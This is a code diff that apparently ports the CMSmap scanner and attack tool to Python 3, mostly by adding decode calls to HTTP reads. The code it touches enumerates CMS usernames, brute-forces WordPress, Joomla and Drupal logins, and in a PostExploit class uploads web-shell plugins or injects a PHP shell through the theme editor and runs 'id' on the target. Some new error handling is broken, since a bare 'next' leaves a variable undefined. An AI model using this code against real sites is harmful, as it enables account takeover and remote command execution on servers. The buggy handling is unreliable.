@@ -92,7 +92,7 @@ class Initialize:
     def GetWordPressPlugins(self):
         msg = "Downloading wordpress plugins from svn website"; report.message(msg)
         f = open(self.wp_plugins, "a")
-        htmltext = urllib.request.urlopen("http://plugins.svn.wordpress.org").read()
+        htmltext = urllib.request.urlopen("http://plugins.svn.wordpress.org").read().decode()
         regex = '">(.+?)/</a></li>'
         pattern =  re.compile(regex)
         plugins = re.findall(pattern,htmltext)
@@ -121,7 +121,7 @@ class Initialize:
         msg = "Downloading drupal modules from drupal.org"; report.message(msg)
         f = open(self.dru_plugins_small, "a")
         for page in range(0,int(10)):
-            htmltext = urllib.request.urlopen("https://drupal.org/project/project_module?page="+str(page)+"&f[4]=sm_field_project_type:full&text=&solrsort=iss_project_release_usage+desc&").read()
+            htmltext = urllib.request.urlopen("https://drupal.org/project/project_module?page="+str(page)+"&f[4]=sm_field_project_type:full&text=&solrsort=iss_project_release_usage+desc&").read().decode()
             regex = '<h2><a href="/project/(\w*?)">'
             pattern =  re.compile(regex)
             self.dru_plugins_extracted = re.findall(pattern,htmltext)
@@ -142,7 +142,7 @@ class Initialize:
         self.regex = regex   
         # Append to file 
         f = open(self.plugins_small, "a") 
-        htmltext = urllib.request.urlopen(self.exploitdb_url).read()
+        htmltext = urllib.request.urlopen(self.exploitdb_url).read().decode()
         regex ='filter_page=(.+?)\t\t\t.*>&gt;&gt;</a>'
         pattern =  re.compile(regex)
         self.pages = re.findall(pattern,htmltext)
@@ -154,12 +154,12 @@ class Initialize:
                 time.sleep(1)
                 self.exploitdb_url_page = "http://www.exploit-db.com/search/?action=search&filter_page="+str(self.page)+"&filter_description="+self.filter_description
                 request = urllib.request.Request(self.exploitdb_url_page,None,self.headers)
-                htmltext = urllib.request.urlopen(request).read()
+                htmltext = urllib.request.urlopen(request).read().decode()
                 pattern =  re.compile('<a href="http://www.exploit-db.com/download/(.+?)/">')
                 self.ExploitID = re.findall(pattern,htmltext)
                 # Search in a single page
                 for self.Eid in self.ExploitID:
-                    htmltext = urllib.request.urlopen("http://www.exploit-db.com/download/"+str(self.Eid)+"/").read()
+                    htmltext = urllib.request.urlopen("http://www.exploit-db.com/download/"+str(self.Eid)+"/").read().decode()
                     pattern =  re.compile(self.regex)
                     self.ExploitDBplugins = re.findall(pattern,htmltext)
                     sys.stdout.write("\r%d%%"%((100*(int(self.page)+1))/int(self.pages)))
@@ -206,11 +206,11 @@ class Scanner:
     def FindCMSType(self):
         req = urllib.request.Request(self.url,None,self.headers)
         try:
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             # WordPress
             req = urllib.request.Request(self.url+"/wp-config.php")
             try:
-                htmltext = urllib.request.urlopen(req).read()       
+                htmltext = urllib.request.urlopen(req).read().decode()       
                 if len(htmltext) not in self.notValidLen and self.force is None:
                     self.force = 'W'
             except urllib.error.HTTPError as e:
@@ -224,7 +224,7 @@ class Scanner:
             # Joomla
             req = urllib.request.Request(self.url+"/configuration.php")
             try:
-                htmltext = urllib.request.urlopen(req).read()              
+                htmltext = urllib.request.urlopen(req).read().decode()              
                 if len(htmltext) not in self.notValidLen and self.force is None:
                     self.force = 'J'
             except urllib.error.HTTPError as e:
@@ -237,7 +237,7 @@ class Scanner:
             # Drupal
             req = urllib.request.Request(self.url+"/sites/default/settings.php")
             try:
-                htmltext = urllib.request.urlopen(req).read()
+                htmltext = urllib.request.urlopen(req).read().decode()
                 if len(htmltext) not in self.notValidLen and self.force is None:
                     self.force = 'D'                               
             except urllib.error.HTTPError as e:
@@ -287,7 +287,7 @@ class Scanner:
             req = urllib.request.Request(self.url+file,None, self.headers)
             noRedirOpener = urllib.request.build_opener(NoRedirects())        
             try:
-                htmltext = noRedirOpener.open(req).read()
+                htmltext = noRedirOpener.open(req).read().decode()
                 self.notValidLen.append(len(htmltext))
             except urllib.error.HTTPError as e:
                 #print e.code
@@ -301,7 +301,7 @@ class Scanner:
         for file in self.NotExisitingFile :
             req = urllib.request.Request(self.url+file,None, self.headers)
             try:
-                htmltext = urllib.request.urlopen(req).read() 
+                htmltext = urllib.request.urlopen(req).read().decode() 
                 self.notValidLen.append(len(htmltext))
             except urllib.error.HTTPError as e:
                 #print e.code
@@ -374,7 +374,7 @@ class WPScan:
     def WPVersion(self):
         try:
             req = urllib.request.Request(self.url+'/readme.html',None,self.headers)
-            htmltext = urllib.request.urlopen(req).read()         
+            htmltext = urllib.request.urlopen(req).read().decode()         
             regex = '.*wordpress-logo.png" /></a>\n.*<br />.* (\d+\.\d+[\.\d+]*)\n</h1>'
             pattern =  re.compile(regex)
             version = re.findall(pattern,htmltext)    
@@ -383,7 +383,7 @@ class WPScan:
         except urllib.error.HTTPError as e:
             try:
                 req = urllib.request.Request(self.url,None,self.headers)
-                htmltext = urllib.request.urlopen(req).read()
+                htmltext = urllib.request.urlopen(req).read().decode()
                 version = re.findall('<meta name="generator" content="WordPress (\d+\.\d+[\.\d+]*)"', htmltext)
                 if version:
                     msg = "Wordpress Version: "+version[0]; report.info(msg)
@@ -400,7 +400,7 @@ class WPScan:
     def WPCurrentTheme(self):
         try:
             req = urllib.request.Request(self.url,None,self.headers)
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             regex = '/wp-content/themes/(.+?)/'
             pattern =  re.compile(regex)
             CurrentTheme = re.findall(pattern,htmltext)
@@ -416,7 +416,7 @@ class WPScan:
         for file in self.confFiles:
             req = urllib.request.Request(self.url+"/wp-config"+file,None,self.headers)
             try:
-                htmltext = urllib.request.urlopen(req).read()
+                htmltext = urllib.request.urlopen(req).read().decode()
                 if len(htmltext) not in self.notValidLen:
                     msg = "Configuration File Found: " +self.url+"/wp-config"+file; report.high(msg)
             except urllib.error.HTTPError as e:
@@ -446,7 +446,7 @@ class WPScan:
         for file in self.defFiles:
             req = urllib.request.Request(self.url+file,None,self.headers)
             try:
-                htmltext = urllib.request.urlopen(req).read()
+                htmltext = urllib.request.urlopen(req).read().decode()
                 if len(htmltext) not in self.notValidLen:
                     self.defFilesFound.append(self.url+file)
             except urllib.error.HTTPError as e:
@@ -459,7 +459,7 @@ class WPScan:
         msg = "Enumerating Wordpress Usernames via \"Feed\" ..."; report.message(msg)
         try:
             req = urllib.request.Request(self.url+self.feed,None,self.headers)
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             wpUsers = re.findall("<dc:creator><!\[CDATA\[(.+?)\]\]></dc:creator>", htmltext,re.IGNORECASE)
             wpUsers2 = re.findall("<dc:creator>(.+?)</dc:creator>", htmltext,re.IGNORECASE)
             if wpUsers :
@@ -476,7 +476,7 @@ class WPScan:
         for user in range(1,20):
             try:
                 req = urllib.request.Request(self.url+self.author+str(user),None,self.headers)
-                htmltext = urllib.request.urlopen(req).read()
+                htmltext = urllib.request.urlopen(req).read().decode()
                 wpUser = re.findall("author author-(.+?) ", htmltext,re.IGNORECASE)
                 if wpUser : self.usernames = wpUser + self.usernames
                 wpUser = re.findall("/author/(.+?)/feed/", htmltext,re.IGNORECASE)
@@ -495,7 +495,7 @@ class WPScan:
         # HTTP POST Request
         req = urllib.request.Request(self.url+self.forgottenPsw, data,self.headers)
         try:
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             if re.findall(re.compile('Invalid username'),htmltext):
                 msg = "Forgotten Password Allows Username Enumeration: "+self.url+self.forgottenPsw; report.info(msg)        
         except urllib.error.HTTPError as e:
@@ -505,7 +505,7 @@ class WPScan:
     def WPHello(self):
         try:
             req = urllib.request.Request(self.url+"/wp-content/plugins/hello.php",None,self.headers)
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             fullPath = re.findall(re.compile('Fatal error.*>/(.+?/)hello.php'),htmltext)
             if fullPath :
                 msg = "Wordpress Hello Plugin Full Path Disclosure: "+"/"+fullPath[0]+"hello.php"; report.low(msg)
@@ -527,7 +527,7 @@ class WPScan:
         req = urllib.request.Request(self.url+self.pluginPath+"N0WayThatYouAreHere"+time.strftime('%d%m%H%M%S')+"/",None, self.headers)
         noRedirOpener = urllib.request.build_opener(NoRedirects())       
         try:
-            htmltext = noRedirOpener.open(req).read()
+            htmltext = noRedirOpener.open(req).read().decode()
             print(htmltext)
             self.notValidLen.append(len(htmltext))
         except urllib.error.HTTPError as e:
@@ -537,7 +537,7 @@ class WPScan:
     def WPpluginsIndex(self):
         try:
             req = urllib.request.Request(self.url,None,self.headers)
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             self.pluginsFound = re.findall(re.compile('/wp-content/plugins/(.+?)/'),htmltext)
             self.pluginsFound = sorted(set(self.pluginsFound))
         except urllib.error.HTTPError as e:
@@ -612,7 +612,7 @@ class WPScan:
         try:
             req = urllib.request.Request(self.url+'/xmlrpc.php',self.postdata,self.headers)
             opener = urllib.request.build_opener(MyHandler())
-            htmltext = opener.open(req).read()
+            htmltext = opener.open(req).read().decode()
             if re.search('<name>16</name>',htmltext):
                 msg = "Website vulnerable to XML-RPC Pingback Force Vulnerability"; report.low(msg)
         except urllib.error.HTTPError as e:
@@ -630,7 +630,7 @@ class WPScan:
             req = urllib.request.Request(self.url+'/xmlrpc.php',self.postdata,self.headers)
             #opener = urllib2.build_opener(urllib2.HTTPHandler(debuglevel=1))
             opener = urllib.request.build_opener(MyHandler())
-            htmltext = opener.open(req).read()
+            htmltext = opener.open(req).read().decode()
             if re.search('<int>403</int>',htmltext):
                 msg = "Website vulnerable to XML-RPC Brute Force Vulnerability"; report.medium(msg)
         except urllib.error.HTTPError as e:
@@ -694,7 +694,7 @@ class JooScan:
         
     def JooVersion(self):
         try:
-            htmltext = urllib.request.urlopen(self.url+'/joomla.xml').read()
+            htmltext = urllib.request.urlopen(self.url+'/joomla.xml').read().decode()
             regex = '<version>(.+?)</version>'
             pattern =  re.compile(regex)
             version = re.findall(pattern,htmltext)
@@ -711,9 +711,9 @@ class JooScan:
 
     def JooTemplate(self):
         try:
-            htmltext = urllib.request.urlopen(self.url+'/index.php').read()
+            htmltext = urllib.request.urlopen(self.url+'/index.php').read().decode()
             WebTemplate = re.findall("/templates/(.+?)/", htmltext,re.IGNORECASE)
-            htmltext = urllib.request.urlopen(self.url+'/administrator/index.php').read()
+            htmltext = urllib.request.urlopen(self.url+'/administrator/index.php').read().decode()
             AdminTemplate = re.findall("/administrator/templates/(.+?)/", htmltext,re.IGNORECASE)
             if WebTemplate[0] : 
                 msg = "Joomla Website Template: "+WebTemplate[0]; report.info(msg)
@@ -729,7 +729,7 @@ class JooScan:
         for file in self.confFiles:
             req = urllib.request.Request(self.url+"/configuration"+file)
             try:
-                htmltext = urllib.request.urlopen(req).read()
+                htmltext = urllib.request.urlopen(req).read().decode()
                 if len(htmltext) not in self.notValidLen:
                     msg = "Configuration File Found: " +self.url+"/configuration"+file; report.high(msg)
             except urllib.error.HTTPError as e:
@@ -758,7 +758,7 @@ class JooScan:
         for file in self.defFiles:
             req = urllib.request.Request(self.url+file,None,self.headers)
             try:
-                htmltext = urllib.request.urlopen(req).read()
+                htmltext = urllib.request.urlopen(req).read().decode()
                 if len(htmltext) not in self.notValidLen:
                     self.defFilesFound.append(self.url+file)
             except urllib.error.HTTPError as e:
@@ -769,7 +769,7 @@ class JooScan:
             
     def JooFeed(self):
         try:
-            htmltext = urllib.request.urlopen(self.url+'/?format=feed').read()
+            htmltext = urllib.request.urlopen(self.url+'/?format=feed').read().decode()
             jooUsers = re.findall("<author>(.+?) \((.+?)\)</author>", htmltext,re.IGNORECASE)
             if jooUsers: 
                 msg = "Enumerating Joomla Usernames via \"Feed\" ..."; report.message(msg)
@@ -806,7 +806,7 @@ class JooScan:
         req = urllib.request.Request(self.url+self.pluginPath+"/N0WayThatYouAreHere"+time.strftime('%d%m%H%M%S')+"/",None, self.headers)
         noRedirOpener = urllib.request.build_opener(NoRedirects())        
         try:
-            htmltext = noRedirOpener.open(req).read()
+            htmltext = noRedirOpener.open(req).read().decode()
             self.notValidLen.append(len(htmltext))
         except urllib.error.HTTPError as e:
             #print e.code
@@ -816,7 +816,7 @@ class JooScan:
     def JooModulesIndex(self):
         try:
             req = urllib.request.Request(self.url,None,self.headers)
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             self.pluginsFound = re.findall(re.compile('/modules/(.+?)/'),htmltext)
             self.pluginsFound = sorted(set(self.pluginsFound))
         except urllib.error.HTTPError as e:
@@ -886,7 +886,7 @@ class DruScan:
         
     def DruVersion(self):
         try:
-            htmltext = urllib.request.urlopen(self.url+'/CHANGELOG.txt').read()
+            htmltext = urllib.request.urlopen(self.url+'/CHANGELOG.txt').read().decode()
             regex = 'Drupal (\d+\.\d+),'
             pattern =  re.compile(regex)
             version = re.findall(pattern,htmltext)
@@ -909,7 +909,7 @@ class DruScan:
 
     def DruCurrentTheme(self):
         try:
-            htmltext = urllib.request.urlopen(self.url+'/index.php').read()
+            htmltext = urllib.request.urlopen(self.url+'/index.php').read().decode()
             DruTheme = re.findall("/themes/(.+?)/", htmltext,re.IGNORECASE)
             if DruTheme :
                 self.Drutheme = DruTheme[0]
@@ -924,7 +924,7 @@ class DruScan:
         for file in self.confFiles:
             req = urllib.request.Request(self.url+"/sites/"+self.netloc+"/settings"+file)
             try:
-                htmltext = urllib.request.urlopen(req).read()
+                htmltext = urllib.request.urlopen(req).read().decode()
                 if len(htmltext) not in self.notValidLen:
                     msg = "Configuration File Found: " +self.url+"/sites/"+self.netloc+"/settings"+file; report.high(msg)
             except urllib.error.HTTPError as e:
@@ -970,7 +970,7 @@ class DruScan:
         for file in self.defFiles:
             req = urllib.request.Request(self.url+file,None,self.headers)
             try:
-                htmltext = urllib.request.urlopen(req).read()
+                htmltext = urllib.request.urlopen(req).read().decode()
                 if len(htmltext) not in self.notValidLen:
                     self.defFilesFound.append(self.url+file)
             except urllib.error.HTTPError as e:
@@ -987,11 +987,11 @@ class DruScan:
         req = urllib.request.Request(self.url+"/?q=admin/views/ajax/autocomplete/user/NotExisingUser1234!",None, self.headers)
         noRedirOpener = urllib.request.build_opener(NoRedirects())        
         try:
-            htmltext = noRedirOpener.open(req).read()
+            htmltext = noRedirOpener.open(req).read().decode()
             #If NotExisingUser1234 returns [], then enumerate users
             if htmltext == '[]':
                 for letter in self.alphanum:
-                    htmltext = urllib.request.urlopen(self.url+self.views+letter).read()
+                    htmltext = urllib.request.urlopen(self.url+self.views+letter).read().decode()
                     regex = '"(.+?)"'
                     pattern =  re.compile(regex)
                     usernames = usernames + re.findall(pattern,htmltext)
@@ -1011,7 +1011,7 @@ class DruScan:
             report.WriteTextFile(msg)
             for blognum in range (1,50):
                 try:
-                    htmltext = urllib.request.urlopen(self.url+self.blog+str(blognum)).read()
+                    htmltext = urllib.request.urlopen(self.url+self.blog+str(blognum)).read().decode()
                     regex = "<title>(.+?)\'s"
                     pattern =  re.compile(regex)
                     user = re.findall(pattern,htmltext)
@@ -1028,12 +1028,12 @@ class DruScan:
     def DruForgottenPassword(self):
         # Username Enumeration via Forgotten Password
         query_args = {"name": "N0t3xist!1234" ,"form_id":"user_pass"}
-        data = urllib.parse.urlencode(query_args)
+        data = urllib.parse.urlencode(query_args).encode()
         # HTTP POST Request
         req = urllib.request.Request(self.url+self.forgottenPsw, data)
         #print "[*] Trying Credentials: "+user+" "+pwd
         try:
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             if re.findall(re.compile('Sorry,.*N0t3xist!1234.*is not recognized'),htmltext):
                 msg = "Forgotten Password Allows Username Enumeration: "+self.url+self.forgottenPsw; report.info(msg)
                 report.WriteTextFile(msg)        
@@ -1059,7 +1059,7 @@ class DruScan:
         req = urllib.request.Request(self.url+self.pluginPath+"/N0WayThatYouAreHere"+time.strftime('%d%m%H%M%S')+"/",None, self.headers)
         noRedirOpener = urllib.request.build_opener(NoRedirects())        
         try:
-            htmltext = noRedirOpener.open(req).read()
+            htmltext = noRedirOpener.open(req).read().decode()
             self.notValidLen.append(len(htmltext))
         except urllib.error.HTTPError as e:
             #print e.code
@@ -1069,7 +1069,7 @@ class DruScan:
     def DruModulesIndex(self):
         try:
             req = urllib.request.Request(self.url,None,self.headers)
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             self.pluginsFound = re.findall(re.compile('/modules/(.+?)/'),htmltext)
             self.pluginsFound = sorted(set(self.pluginsFound))
         except urllib.error.HTTPError as e:
@@ -1108,8 +1108,11 @@ class ExploitDBSearch:
             # Get this value from their classes      
             msg = "Searching Core Vulnerabilities for version "+self.query ; report.verbose(msg)           
             dbText = subprocess.run("searchsploit --colour --json "+self.query+" "+self.cmstype, shell=True, stdout=subprocess.PIPE)
-            Exploits = json.loads(dbText.stdout.decode().replace("}\n","},\n").replace("},\n\t]\n},\n","}\n\t]\n}"))
-            for Exploit in Exploits('RESULTS'):
+            try:
+                Exploits = json.loads(dbText.stdout.decode().replace("}\n","},\n").replace("},\n\t]\n},\n","}\n\t]\n}"))
+            except json.decoder.JSONDecodeError:
+                next
+            for Exploit in Exploits['RESULTS']:
                 # If Eid hasn't been already found, then go on
                 if Exploit['EDB-ID'] not in self.flagged:
                     self.title = Exploit['Exploit']
@@ -1119,11 +1122,11 @@ class ExploitDBSearch:
                         if 'Not Verified' in f.read():
                             self.verified = 'No'
                     if self.title and self.date:
-                        msg = " EDB-ID: "+Exploit['EDB-ID']+" Date: "+self.date[0] +" Verified: "+self.verified+" Title: "+ self.title[0].replace('&gt;', '>').replace('&lt;','<').replace('&amp;','&')
+                        msg = " EDB-ID: "+str(Exploit['EDB-ID'])+" Date: "+self.date +" Verified: "+self.verified+" Title: "+ self.title.replace('&gt;', '>').replace('&lt;','<').replace('&amp;','&')
                         report.medium(msg)
                     else:
-                        msg = " EDB-ID: "+Exploit['EDB-ID']; report.medium(msg)
-            self.flagged = self.flagged + Exploit['EDB-ID']
+                        msg = " EDB-ID: "+str(Exploit['EDB-ID']); report.medium(msg)
+            self.flagged = self.flagged + [Exploit['EDB-ID']]
             self.flagged = sorted(set(self.flagged))
         else:
             pass
@@ -1135,9 +1138,12 @@ class ExploitDBSearch:
                 msg =  plugin; report.info(msg)
                 if not NoExploitdb :
                     dbText = subprocess.run("searchsploit --colour --json "+plugin+" "+self.cmstype, shell=True, stdout=subprocess.PIPE)
-                    Exploits = json.loads(dbText.stdout.decode().replace("}\n","},\n").replace("},\n\t]\n},\n","}\n\t]\n}"))
+                    try:
+                        Exploits = json.loads(dbText.stdout.decode().replace("}\n","},\n").replace("},\n\t]\n},\n","}\n\t]\n}"))
+                    except json.decoder.JSONDecodeError:
+                        next
                     if plugin not in self.exclude:
-                        for Exploit in Exploits:
+                        for Exploit in Exploits['RESULTS']:
                             # If Eid hasn't been already found, then go on
                             if Exploit['EDB-ID'] not in self.flagged:
                                 self.title = Exploit['Exploit']
@@ -1147,11 +1153,11 @@ class ExploitDBSearch:
                                     if 'Not Verified' in f.read():
                                         self.verified = 'No'
                                 if self.title and self.date:
-                                    msg = " EDB-ID: "+Exploit['EDB-ID']+" Date: "+self.date[0] +" Verified: "+self.verified+" Title: "+ self.title[0].replace('&gt;', '>').replace('&lt;','<').replace('&amp;','&')
+                                    msg = " EDB-ID: "+str(Exploit['EDB-ID'])+" Date: "+self.date +" Verified: "+self.verified+" Title: "+ self.title.replace('&gt;', '>').replace('&lt;','<').replace('&amp;','&')
                                     report.medium(msg)
                                 else:
-                                    msg = " EDB-ID: "+Exploit['EDB-ID']; report.medium(msg)
-                        self.flagged = self.flagged + Exploit['EDB-ID']
+                                    msg = " EDB-ID: "+str(Exploit['EDB-ID']); report.medium(msg)
+                        self.flagged = self.flagged + [Exploit['EDB-ID']]
                         self.flagged = sorted(set(self.flagged))
         else:
             pass
@@ -1161,8 +1167,11 @@ class ExploitDBSearch:
             msg = "Searching Vulnerable Theme from ExploitDB website ..."; report.verbose(msg)
             for theme in self.query :
                 dbText = subprocess.run("searchsploit --colour --json "+theme+" "+self.cmstype, shell=True, stdout=subprocess.PIPE)
-                Exploits = json.loads(dbText.stdout.decode().replace("}\n","},\n").replace("},\n\t]\n},\n","}\n\t]\n}"))
-                for Exploit in Exploits:
+                try:
+                    Exploits = json.loads(dbText.stdout.decode().replace("}\n","},\n").replace("},\n\t]\n},\n","}\n\t]\n}"))
+                except json.decoder.JSONDecodeError:
+                    next
+                for Exploit in Exploits['RESULTS']:
                     # If Eid hasn't been already found, then go on
                     if Exploit['EDB-ID'] not in self.flagged:
                         self.title = Exploit['Exploit']
@@ -1172,11 +1181,11 @@ class ExploitDBSearch:
                             if 'Not Verified' in f.read():
                                 self.verified = 'No'
                         if self.title and self.date:
-                            msg = " EDB-ID: "+Exploit['EDB-ID']+" Date: "+self.date[0] +" Verified: "+self.verified+" Title: "+ self.title[0].replace('&gt;', '>').replace('&lt;','<').replace('&amp;','&')
+                            msg = " EDB-ID: "+str(Exploit['EDB-ID'])+" Date: "+self.date +" Verified: "+self.verified+" Title: "+ self.title.replace('&gt;', '>').replace('&lt;','<').replace('&amp;','&')
                             report.medium(msg)
                         else:
-                            msg = " EDB-ID: "+Exploit['EDB-ID']; report.medium(msg)
-                self.flagged = self.flagged + Exploit['EDB-ID']
+                            msg = " EDB-ID: "+str(Exploit['EDB-ID']); report.medium(msg)
+                self.flagged = self.flagged + [Exploit['EDB-ID']]
                 self.flagged = sorted(set(self.flagged))                
         else:
             pass
@@ -1202,7 +1211,7 @@ class ThreadScanner(threading.Thread):
         self.pluginPathEnd = pluginPathEnd
         self.notExistingCode = notExistingCode
         self.notValidLen = notValidLen
-        self.headers={'User-Agent':agent,'Accept-Encoding': None,}
+        self.headers={'User-Agent':agent,'Accept-Encoding': '*',}
 
     def run(self):
         while True:
@@ -1216,6 +1225,9 @@ class ThreadScanner(threading.Thread):
                 if e.code != self.notExistingCode and len(e.read()) not in self.notValidLen : self.pluginsFound.append(plugin)
             except urllib.error.URLError as e:
                 msg = "Thread Error: If this error persists, reduce number of threads"; print((report.info(msg)))
+            except TypeError as e:
+                for key,val in self.headers.items():
+                    print(key + " => " + str(val or 'None'))
             self.q.task_done()       
 
 class BruteForcer:
@@ -1268,7 +1280,7 @@ class BruteForcer:
                     try:
                         req = urllib.request.Request(self.url+'/xmlrpc.php',self.postdata,self.headers)
                         opener = urllib.request.build_opener(MyHandler())
-                        htmltext = opener.open(req).read()
+                        htmltext = opener.open(req).read().decode()
                         if re.search('<name>isAdmin</name><value><boolean>0</boolean>',htmltext):
                             msg = "Valid Credentials: "+user+" "+pwd; report.high(msg)
                             self.WPValidCredentials.append([user,pwd])
@@ -1301,7 +1313,7 @@ class BruteForcer:
                     msg = "Trying Credentials: "+user+" "+pwd; report.verbose(msg)
                     try:
                         # HTTP POST Request
-                        htmltext = opener.open(self.url+self.wplogin, data).read()
+                        htmltext = opener.open(self.url+self.wplogin, data).read().decode()
                         if re.search('<strong>ERROR</strong>: Invalid username',htmltext):
                             msg = "Invalid Username: "+user; report.message(msg)
                             break
@@ -1335,7 +1347,7 @@ class BruteForcer:
                 opener.addheaders = [('User-agent',agent)]
                 cookieJar.clear()
                 # Get Token and Session Cookie
-                htmltext = opener.open(self.url+self.joologin).read()
+                htmltext = opener.open(self.url+self.joologin).read().decode()
                 reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
                 if reg.search(htmltext) is not None:
                     token = reg.search(htmltext).group(1)
@@ -1346,7 +1358,7 @@ class BruteForcer:
                         data = urllib.parse.urlencode(query_args)
                         msg = "Trying Credentials: "+user+" "+pwd; report.verbose(msg)
                         try:
-                            htmltext = opener.open(self.url+self.joologin, data).read()
+                            htmltext = opener.open(self.url+self.joologin, data).read().decode()
                             if re.findall(re.compile('Joomla - Administration - Control Panel'),htmltext):
                                 msg = "Valid Credentials: "+user+" "+pwd; report.high(msg)
                                 self.JooValidCredentials.append([user,pwd])
@@ -1373,7 +1385,7 @@ class BruteForcer:
                     req = urllib.request.Request(self.url+self.drulogin, data,self.headers)
                     msg = "Trying Credentials: "+user+" "+pwd; report.verbose(msg)
                     try:
-                        htmltext = urllib.request.urlopen(req).read()
+                        htmltext = urllib.request.urlopen(req).read().decode()
                         if re.findall(re.compile('Sorry, too many failed login attempts|Try again later'),htmltext):
                             msg = "Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"
                             report.error(msg)
@@ -1410,11 +1422,11 @@ class PostExploit:
             msg ="Logging in to the target website as "+user+":"+password; report.message(msg)
             opener.open(self.url+self.wplogin, urllib.parse.urlencode(self.query_args_login))
             # Request WordPress Plugin Upload page
-            htmltext = opener.open(self.url+self.wppluginpage).read()
+            htmltext = opener.open(self.url+self.wppluginpage).read().decode()
             self.wpnonce = re.findall(re.compile('name="_wpnonce" value="(.+?)"'),htmltext)
             # Upload Plugin
             self.params = { "_wpnonce" : self.wpnonce[0],"pluginzip" : open("shell/wp-shell.zip", "rb") , "install-plugin-submit":"Install Now"}
-            htmltext = opener.open(self.url+self.wpupload, self.params).read()
+            htmltext = opener.open(self.url+self.wpupload, self.params).read().decode()
             if re.search("Plugin installed successfully",htmltext):
                 msg = "CMSmap WordPress Shell Plugin Was Successfully Installed!"; report.high(msg)
                 msg = "Web Shell: "+self.url+"/wp-content/plugins/wp-shell/shell.php"; report.high(msg)
@@ -1447,12 +1459,12 @@ class PostExploit:
             opener.open(self.url+self.wplogin, urllib.parse.urlencode(self.query_args_login))
             
             msg = "[-] Looking for Theme Editor Page on the target website ..."; report.verbose(msg)
-            htmltext = opener.open(self.url+self.wpThemePage).read()
+            htmltext = opener.open(self.url+self.wpThemePage).read().decode()
             tempPages = re.findall(re.compile('href=\"theme-editor\.php\?file=(.+?)\.php'),htmltext)
             
             msg = "[-] Looking for a writable theme page on the target website ..."; report.verbose(msg)
             for tempPage in tempPages:      
-                htmltext = opener.open(self.url+"/wp-admin/theme-editor.php"+"?file="+tempPage+".php&theme="+self.theme).read()
+                htmltext = opener.open(self.url+"/wp-admin/theme-editor.php"+"?file="+tempPage+".php&theme="+self.theme).read().decode()
                 if re.search('value="Update File"', htmltext) :
                     msg =  "Writable theme page found : "+ tempPage+".php"; report.medium(msg)
                     self.wpnonce = re.findall(re.compile('name="_wpnonce" value="(.+?)"'),htmltext)              
@@ -1465,9 +1477,9 @@ class PostExploit:
                     data = urllib.parse.urlencode(query_args)
                     
                     msg = "Updating a new theme page with a PHP shell on the target website ..."; report.message(msg)
-                    opener.open(self.url+"/wp-admin/theme-editor.php",data).read()
+                    opener.open(self.url+"/wp-admin/theme-editor.php",data).read().decode()
                     
-                    htmltext = urllib.request.urlopen(self.url+"/wp-content/themes/"+self.theme+"/"+tempPage+".php?c=id").read()
+                    htmltext = urllib.request.urlopen(self.url+"/wp-content/themes/"+self.theme+"/"+tempPage+".php?c=id").read().decode()
                     if re.search('uid=\d+\(.+?\) gid=\d+\(.+?\) groups=\d+\(.+?\)', htmltext) :
                         msg = "Web shell Found: " + self.url+"/wp-content/themes/"+self.theme+"/"+tempPage+".php?c=id"; report.high(msg)
                         msg = "$ id"; report.high(msg)
@@ -1493,21 +1505,21 @@ class PostExploit:
             msg = "[-] Logging into the target website ..."; report.verbose(msg)
 
             # Get Token and Session Cookie
-            htmltext = opener.open(self.url+self.joologin).read()
+            htmltext = opener.open(self.url+self.joologin).read().decode()
             reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
             self.token = reg.search(htmltext).group(1)     
             # Logining on the website with username and password
             self.query_args_login = {"username": user ,"passwd": password, "option":"com_login","task":"login",self.token:"1"}
             data = urllib.parse.urlencode(self.query_args_login)
-            htmltext = opener.open(self.url+self.joologin, data).read()
+            htmltext = opener.open(self.url+self.joologin, data).read().decode()
             # Get Token in Upload Page
-            htmltext = opener.open(self.url+self.jooupload).read()
+            htmltext = opener.open(self.url+self.jooupload).read().decode()
             reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
             try:
                 self.token = reg.search(htmltext).group(1)
                 # Upload Component
                 self.params = { "install_package" : open("shell/joo-shell.zip", "rb") , "installtype":"upload","task":"install.install",self.token:"1"}
-                htmltext = opener.open(self.url+self.jooupload, self.params).read()
+                htmltext = opener.open(self.url+self.jooupload, self.params).read().decode()
                 if re.search("Installing component was successful.",htmltext):
                     msg ="CMSmap Joomla Shell Plugin Installed"; report.high(msg)
                     msg = "Web Shell: "+self.url+"/components/com_joo-shell/joo-shell.php"; report.high(msg)
@@ -1535,23 +1547,23 @@ class PostExploit:
             # HTTP POST Request
             msg = "Logging in to the target website ..."; report.verbose(msg)
             # Get Token and Session Cookie
-            htmltext = opener.open(self.url+self.joologin).read()
+            htmltext = opener.open(self.url+self.joologin).read().decode()
             reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
             token = reg.search(htmltext).group(1)            
             # Logging in to the website with username and password
             query_args = {"username": user ,"passwd": password, "option":"com_login","task":"login",token:"1"}
             data = urllib.parse.urlencode(query_args)
-            htmltext = opener.open(self.url+self.joologin, data).read()
+            htmltext = opener.open(self.url+self.joologin, data).read().decode()
             
             msg = "Looking for Administrator Template on the target website ..."; report.verbose(msg)
-            htmltext = opener.open(self.url+self.jooThemePage).read()
+            htmltext = opener.open(self.url+self.jooThemePage).read().decode()
             # Gets template IDs
             tempPages = re.findall(re.compile('view=template&amp;id=(.+?) ">'),htmltext)
             
             msg = "Looking for a writable themplate on the target website ..."; report.verbose(msg)
             for tempPage in tempPages:
                 # For each template ID   
